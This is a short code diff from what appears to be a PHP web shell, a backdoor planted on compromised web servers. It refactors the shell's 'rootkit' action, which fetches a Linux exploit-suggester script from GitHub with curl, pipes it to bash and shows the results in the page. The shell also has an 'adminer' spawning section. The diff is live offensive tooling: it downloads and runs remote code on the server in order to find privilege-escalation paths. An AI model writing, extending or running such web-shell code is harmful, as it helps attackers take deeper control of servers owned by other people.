@@ -2084,8 +2084,7 @@ if($s_auth){
 
 	// spawn suggester
 	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='rootkit')){
-        	$neko = exe("curl -Lsk http://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash");
-		$s_result .= "<pre><code>$neko</code></pre>";
+		$s_result .= "<pre><code>".exe("curl -Lsk http://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash")."</code></pre>";
 	}
 
 	// spawn adminer
